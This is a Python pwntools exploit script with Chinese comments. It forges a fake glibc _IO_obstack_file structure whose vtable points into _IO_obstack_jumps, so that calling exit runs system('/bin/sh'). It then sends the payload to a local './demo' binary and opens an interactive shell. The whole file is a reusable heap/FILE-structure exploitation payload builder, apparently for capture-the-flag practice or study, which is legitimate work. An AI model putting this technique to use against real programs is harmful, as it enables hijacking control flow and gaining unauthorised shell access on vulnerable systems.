from pwn import *
from base_data import *

def HOQSPP(_IO_obstack_jumps_addr, payload_addr,  fun_addr, param = None, fun_offset = -4):
    '''
        _IO_obstack_jumps_addr: _IO_obstack_jumps的实际地址
        payload_addr: payload将要写入的地址
        fun_addr: 要调用的函数的实际地址
        param: 函数的参数, 默认为内置的/bin/sh地址
        fun_offset: 函数指针与在_IO_obstack_jumps->xsputn的偏移, 默认是overflow函数与xsputn的偏移, exit就可以触发漏洞
        
        返回: 伪造的_IO_obstack_file结构体
    '''
    if param is None:
        param = payload_addr + 0x40
    
    payload = b''
    payload = set_value(payload, 0x18, 0x0);                                          # fake_obstack->next_free = 0
    payload = set_value(payload, 0x20, 0x0);                                          # fake_obstack->chunk_limit = 0
    payload = set_value(payload, 0x28, 0x1);                                          # fake_IO_FILE_plus->_IO_write_ptr = 1
    payload = set_value(payload, 0x30, 0x0);                                          # fake_IO_FILE_plus->_IO_write_end = 0
    payload = set_value(payload, 0x38, fun_addr);                                     # fake_obstack->chunkfun = system
    payload = set_value(payload, 0x40, BINSH);                                        # /bin/sh字符串值
    payload = set_value(payload, 0x48, param);                                        # fake_obstack->extra_arg = /bin/sh地址
    payload = set_value(payload, 0x50, 0xFFFFFFFFFFFFFFFF);                           # fake_obstack->use_extra_arg = 1
    payload = set_value(payload, 0xD8, _IO_obstack_jumps_addr + 0x8 * (-fun_offset)); # fake_IO_FILE_plus->vtable = _IO_obstack_jumps + 0x8 * 4
    payload = set_value(payload, 0xE0, payload_addr);                                 # fake_IO_obstack_file->obstack = fake_IO_obstack, 我们重复利用空间
    
    return payload

if __name__ == '__main__':
    p = process('./demo')
    
    _IO_obstack_jumps_addr = int(p.recv(14), 16)
    system_addr = int(p.recv(14), 16)
    fake_addr = int(p.recv(14), 16)
    
    p.send(HOQSPP(_IO_obstack_jumps_addr, fake_addr, system_addr))
    
    p.interactive()